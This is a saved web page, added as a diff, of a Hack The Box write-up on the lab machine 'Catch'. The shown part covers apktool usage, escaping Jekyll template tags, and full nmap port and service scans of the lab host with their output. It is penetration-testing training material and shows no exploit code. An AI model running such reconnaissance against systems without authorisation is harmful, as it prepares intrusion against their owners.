@@ -1,0 +1,1401 @@
+<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hack The Box - Catch Writeup" /><meta property="og:locale" content="en_US" /><meta name="description" content="Zweilosec’s writeup on the medium-difficulty Linux machine Catch from https://hackthebox.com" /><meta property="og:description" content="Zweilosec’s writeup on the medium-difficulty Linux machine Catch from https://hackthebox.com" /><link rel="canonical" href="https://zweilosec.github.io/posts/catch/" /><meta property="og:url" content="https://zweilosec.github.io/posts/catch/" /><meta property="og:site_name" content="Hacker’s Rest" /><meta property="og:image" content="https://zweilosec.github.io/assets/img/catch_0_infocard.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-04-14T14:00:00+00:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://zweilosec.github.io/assets/img/catch_0_infocard.png" /><meta property="twitter:title" content="Hack The Box - Catch Writeup" /><meta name="twitter:site" content="@zweilosec" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-04-14T14:00:00+00:00","datePublished":"2022-04-14T14:00:00+00:00","description":"Zweilosec’s writeup on the medium-difficulty Linux machine Catch from https://hackthebox.com","headline":"Hack The Box - Catch Writeup","image":"https://zweilosec.github.io/assets/img/catch_0_infocard.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://zweilosec.github.io/posts/catch/"},"url":"https://zweilosec.github.io/posts/catch/"}</script><title>Hack The Box - Catch Writeup | Hacker's Rest</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Hacker's Rest"><meta name="application-name" content="Hacker's Rest"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=UA-170504820-1"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-170504820-1'); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avatar/katana.gif" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Hacker's Rest</a></div><div class="site-subtitle font-italic">Notes documenting my journey to OSCP and beyond.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>PS C:\>WHOAMI</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/zweilosec" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/zweilosec" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack The Box - Catch Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack The Box - Catch Writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> zweilosec </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Thu, Apr 14, 2022, 2:00 PM +0000" prep="on" > Apr 14, 2022 <i class="unloaded">2022-04-14T14:00:00+00:00</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="6973 words">38 min</span></div><div><meta name="twitter:card" content="summary"><meta name="twitter:site" content="@zweilosec"></div></div><div class="post-content"><h2 id="htb---catch---101011150">HTB - Catch - 10.10.11.150</h2><h2 id="overview">Overview</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/catch_0_infocard.png" alt="Descriptive information card about this machine" /></p><p>This medium-difficulty machine by MrR3boot from https://hackthebox.com was a very interesting challenge. It was made much harder than it should have been by a huge rabbit chase in the middle that seemed to be a very viable approach. This was due to it being an actual CVE-identified vulnerability, and an acccessible endpoint. Aside from this, the machine was a great learning experience in multiple areas, included code analysis, build of an Android APK, and figuring out how to get code examples to display on this blog post. I thoroughly enjoyed this fun challenge!</p><h2 id="useful-skills-and-tools">Useful Skills and Tools</h2><h3 id="build-or-decompile-apks-with-apktool">Build or Decompile APKs with apktool</h3><h4 id="decompiling-an-apk">Decompiling an APK</h4><p>If you want to decompile an Android APK application to see what files are inside run the following command:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>apktool d $apk_file
+</pre></table></code></div></div><p>This will make a new folder in the current directory with the contents of the APK.</p><h4 id="building-an-apk-from-scratch">Building an APK from scratch</h4><p>To build a new Android APK application from scratch, begin with the following file and folder layout.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>appName
+    |--res
+    |    |--layout
+    |           |--activity_main.xml
+    |--src
+    |   |--com
+    |       |--myapp
+    |              |--MainActivity.java
+    |
+    |--AndroidManifest.xml
+</pre></table></code></div></div><p>These are the minimum files and folders that are required to compile a viable APK. See the link below for more information on the minimum structure of each of these files.</p><ul><li>https://ajinasokan.com/posts/smallest-app/</ul><p>In order to run this application, you will need to compile it. The easiest way to do this is to use apktool. In directory above your application <code class="language-plaintext highlighter-rouge">appName</code> folder, run the following command using your application’s name:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>apktool b appName
+</pre></table></code></div></div><p>Note: you may have to create an <code class="language-plaintext highlighter-rouge">apktool.yml</code> file in order to get the tool to build your application. Create this file using the below structure:</p><div class="language-yml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre><span class="na">version</span><span class="pi">:</span> <span class="s">2.0.0</span>
+<span class="na">apkFileName</span><span class="pi">:</span> <span class="s">pkgid8.apk</span>
+<span class="na">isFrameworkApk</span><span class="pi">:</span> <span class="no">false</span>
+<span class="na">usesFramework</span><span class="pi">:</span>
+  <span class="na">ids</span><span class="pi">:</span>
+  <span class="pi">-</span> <span class="m">1</span>
+<span class="na">packageInfo</span><span class="pi">:</span>
+  <span class="na">forcedPackageId</span><span class="pi">:</span> <span class="s1">'</span><span class="s">128'</span>
+<span class="na">versionInfo</span><span class="pi">:</span>
+  <span class="na">versionCode</span><span class="pi">:</span> <span class="s1">'</span><span class="s">1'</span>
+  <span class="na">versionName</span><span class="pi">:</span> <span class="s1">'</span><span class="s">1.0'</span>
+<span class="na">compressionType</span><span class="pi">:</span> <span class="no">false</span>
+</pre></table></code></div></div><h3 id="display-jekyll-liquid-tags-in-a-markdown-codeblock-on-github-pages">Display Jekyll Liquid tags in a Markdown codeblock on GitHub Pages</h3><p>This blog post was written using GitHub-flavored Markdown. In order to render some of the code examples so that you can see them, some workarounds have to be made sometimes. In this post in particular, the templates that are used for injection use the same type of notation as Jekyll’s Liquid. In order to display the code examples I had to do some hunting. I found the below example from stackoverflow.com that worked to solve this problem.</p><ul><li>https://stackoverflow.com/questions/3426182/how-to-escape-liquid-template-tags<ul><li>https://stackoverflow.com/a/57120464 (direct link to the answer that worked)</ul></ul><p>The answer by @liquidat about 3/4 down the page is the only one that would work for me. It involved putting the <code class="language-plaintext highlighter-rouge">raw</code> and <code class="language-plaintext highlighter-rouge">endraw</code> liquid tags in HTML comments.</p><p>It is very difficult to get this rendering of the code to render the code…codeception is happening and breaking everything, so I will have to refrain from showing you directly. However, I can attest that this worked and the code later on in this writeup works properly because of it!</p><h2 id="enumeration">Enumeration</h2><h3 id="nmap-scan">Nmap scan</h3><p>I started my enumeration with an nmap scan of <code class="language-plaintext highlighter-rouge">10.10.11.150</code>. The options I regularly use are:</p><div class="table-wrapper"><table><thead><tr><th style="text-align: left"><code class="language-plaintext highlighter-rouge">Flag</code><th style="text-align: left">Purpose<tbody><tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-p-</code><td style="text-align: left">A shortcut which tells nmap to scan all ports<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-vvv</code><td style="text-align: left">Gives very verbose output so I can see the results as they are found, and also includes some information not normally shown<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-sC</code><td style="text-align: left">Equivalent to <code class="language-plaintext highlighter-rouge">--script=default</code> and runs a collection of nmap enumeration scripts against the target<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-sV</code><td style="text-align: left">Does a service version scan<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-oA $name</code><td style="text-align: left">Saves all three formats (standard, greppable, and XML) of output with a filename of <code class="language-plaintext highlighter-rouge">$name</code><tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-Pn</code><td style="text-align: left">Skips doing a ICMP ping check, useful for hosts that do not reply to these</table></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>zweilos㉿kalimaa<span class="o">)</span>-[~/htb/timelapse]
+└─<span class="nv">$ </span>nmap <span class="nt">-Pn</span> <span class="nt">-vvv</span> <span class="nt">-p-</span> <span class="nt">--min-rate</span> 1000 10.10.11.150 <span class="nt">-oN</span> ../catch/ports.catch           
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-07-16 17:04 CDT
+Initiating Parallel DNS resolution of 1 host. at 17:04
+Completed Parallel DNS resolution of 1 host. at 17:04, 0.04s elapsed
+DNS resolution of 1 IPs took 0.04s. Mode: Async <span class="o">[</span><span class="c">#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]</span>
+Initiating Connect Scan at 17:04
+Scanning 10.10.11.150 <span class="o">[</span>65535 ports]
+Discovered open port 80/tcp on 10.10.11.150
+Discovered open port 22/tcp on 10.10.11.150
+Discovered open port 5000/tcp on 10.10.11.150
+Discovered open port 3000/tcp on 10.10.11.150
+Discovered open port 8000/tcp on 10.10.11.150
+Completed Connect Scan at 17:05, 50.82s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.11.150
+Host is up, received user-set <span class="o">(</span>0.059s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2022-07-16 17:04:25 CDT <span class="k">for </span>51s
+Not shown: 65530 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+PORT     STATE SERVICE  REASON
+22/tcp   open  ssh      syn-ack
+80/tcp   open  http     syn-ack
+3000/tcp open  ppp      syn-ack
+5000/tcp open  upnp     syn-ack
+8000/tcp open  http-alt syn-ack
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>50.91 seconds
+                                                                                                   
+┌──<span class="o">(</span>zweilos㉿kalimaa<span class="o">)</span>-[~/htb/catch]
+└─<span class="nv">$ </span><span class="nb">cat </span>ports.catch | <span class="nb">grep </span>open | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">'/'</span> <span class="nt">-f</span> 1 | <span class="nb">tr</span> <span class="s1">'\n'</span> <span class="s1">','</span> <span class="o">&gt;</span> ports
+</pre></table></code></div></div><p>An initial port scan revealed that ports 22,80,3000,5000, and 8000 were open. I then used some bash commandline kungfu to put these ports into a list that could be fed back into nmap to do a more thorough service enumeration.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>zweilos㉿kalimaa<span class="o">)</span>-[~/htb/catch]
+└─<span class="nv">$ </span>nmap <span class="nt">-Pn</span> <span class="nt">-sCV</span> <span class="nt">-vvv</span> <span class="nt">-p</span><span class="si">$(</span><span class="nb">cat </span>ports<span class="si">)</span> <span class="nt">--min-rate</span> 1000 10.10.11.150 <span class="nt">-oA</span> services.catch
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-07-16 17:12 CDT
+NSE: Loaded 155 scripts <span class="k">for </span>scanning.
+
+Initiating Connect Scan at 17:12
+Scanning 10.10.11.150 <span class="o">[</span>5 ports]
+Discovered open port 22/tcp on 10.10.11.150
+Discovered open port 3000/tcp on 10.10.11.150
+Discovered open port 80/tcp on 10.10.11.150
+Discovered open port 5000/tcp on 10.10.11.150
+Discovered open port 8000/tcp on 10.10.11.150
+Completed Connect Scan at 17:12, 0.06s elapsed <span class="o">(</span>5 total ports<span class="o">)</span>
+Initiating Service scan at 17:12
+Scanning 5 services on 10.10.11.150
+
+Completed Service scan at 17:13, 89.06s elapsed <span class="o">(</span>5 services on 1 host<span class="o">)</span>
+NSE: Script scanning 10.10.11.150.
+
+Nmap scan report <span class="k">for </span>10.10.11.150
+Host is up, received user-set <span class="o">(</span>0.061s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2022-07-16 17:12:04 CDT <span class="k">for </span>92s
+
+PORT     STATE SERVICE REASON  VERSION
+22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae <span class="o">(</span>RSA<span class="o">)</span>
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU<span class="o">=</span>
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f <span class="o">(</span>ECDSA<span class="o">)</span>
+| ecdsa-sha2-nistp256 <span class="nv">AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A</span><span class="o">=</span>
+|   256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb <span class="o">(</span>ED25519<span class="o">)</span>
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
+80/tcp   open  http    syn-ack Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-title: Catch Global Systems
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+3000/tcp open  ppp?    syn-ack
+| fingerprint-strings: 
+|   GenericLines, Help, RTSPRequest: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+|     Set-Cookie: <span class="nv">i_like_gitea</span><span class="o">=</span>9bf2b818f0ed03c7<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> HttpOnly
+|     Set-Cookie: <span class="nv">_csrf</span><span class="o">=</span>70XmGOR0KuGDq53MrWEE0ZWRrVE6MTY1ODAwOTUyNzcyOTU3NDk5MA<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> <span class="nv">Expires</span><span class="o">=</span>Sun, 17 Jul 2022 22:12:07 GMT<span class="p">;</span> HttpOnly<span class="p">;</span> <span class="nv">SameSite</span><span class="o">=</span>Lax
+|     Set-Cookie: <span class="nv">macaron_flash</span><span class="o">=</span><span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> Max-Age<span class="o">=</span>0<span class="p">;</span> HttpOnly
+|     X-Frame-Options: SAMEORIGIN
+|     Date: Sat, 16 Jul 2022 22:12:07 GMT
+|     &lt;<span class="o">!</span>DOCTYPE html&gt;
+|     &lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">"en-US"</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"theme-"</span><span class="o">&gt;</span>
+|     &lt;<span class="nb">head </span>data-suburl<span class="o">=</span><span class="s2">""</span><span class="o">&gt;</span>
+|     &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"utf-8"</span><span class="o">&gt;</span>
+|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"viewport"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"width=device-width, initial-scale=1"</span><span class="o">&gt;</span>
+|     &lt;meta http-equiv<span class="o">=</span><span class="s2">"x-ua-compatible"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"ie=edge"</span><span class="o">&gt;</span>
+|     &lt;title&gt; Catch Repositories &lt;/title&gt;
+|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"manifest"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"data:application/json;base64,eyJuYW1lIjoiQ2F0Y2ggUmVwb3NpdG9yaWVzIiwic2hvcnRfbmFtZSI6IkNhdGNoIFJlcG9zaXRvcmllcyIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jYXRjaC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNhdGNoLmh0Yjoz
+|   HTTPOptions: 
+|     HTTP/1.0 405 Method Not Allowed
+|     Set-Cookie: i_like_gitea=ec5dd274c199a451; Path=/; HttpOnly
+|     Set-Cookie: _csrf=MV_EhpnlW73O_FfbTp5On2xmzxY6MTY1ODAwOTUzMzA1NTg3NzM1MA; Path=/; Expires=Sun, 17 Jul 2022 22:12:13 GMT; HttpOnly; SameSite=Lax
+|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly
+|     X-Frame-Options: SAMEORIGIN
+|     Date: Sat, 16 Jul 2022 22:12:13 GMT
+|_    Content-Length: 0
+5000/tcp open  upnp?   syn-ack
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, RTSPRequest, SMBProgNeg, ZendJavaBridge: 
+|     HTTP/1.1 400 Bad Request
+|     Connection: close
+|   GetRequest: 
+|     HTTP/1.1 302 Found
+|     X-Frame-Options: SAMEORIGIN
+|     X-Download-Options: noopen
+|     X-Content-Type-Options: nosniff
+|     X-XSS-Protection: 1; mode=block
+|     Content-Security-Policy: 
+|     X-Content-Security-Policy: 
+|     X-WebKit-CSP: 
+|     X-UA-Compatible: IE=Edge,chrome=1
+|     Location: /login
+|     Vary: Accept, Accept-Encoding
+|     Content-Type: text/plain; charset=utf-8
+|     Content-Length: 28
+|     Set-Cookie: connect.sid=s%3AqHDqYy82KHFoB7Lk_4Wdw0SaI62ZnqQk.qz3gaeB4sv65FV1HUzAog%2FOnChAxQrYEwtRPqlHrkCc; Path=/; HttpOnly
+|     Date: Sat, 16 Jul 2022 22:12:12 GMT
+|     Connection: close
+|     Found. Redirecting to /login
+|   HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     X-Frame-Options: SAMEORIGIN
+|     X-Download-Options: noopen
+|     X-Content-Type-Options: nosniff
+|     X-XSS-Protection: 1; mode=block
+|     Content-Security-Policy: 
+|     X-Content-Security-Policy: 
+|     X-WebKit-CSP: 
+|     X-UA-Compatible: IE=Edge,chrome=1
+|     Allow: GET,HEAD
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 8
+|     ETag: W/"</span>8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg<span class="s2">"
+|     Set-Cookie: connect.sid=s%3ALVskBEzY1lt8IorL30wSD1CVEc2F6ZCc.ZdL6myGeTMtYsX2S%2Fb4cZ0wdPg%2Bkc%2B%2BPO6fcTT2wnBg; Path=/; HttpOnly
+|     Vary: Accept-Encoding
+|     Date: Sat, 16 Jul 2022 22:12:13 GMT
+|     Connection: close
+|_    GET,HEAD
+8000/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Catch Global Systems
+|_http-favicon: Unknown favicon MD5: 69A0E6A171C4ED8855408ED902951594
+| http-methods: 
+|_  Supported Methods: GET HEAD OPTIONS
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 92.64 seconds
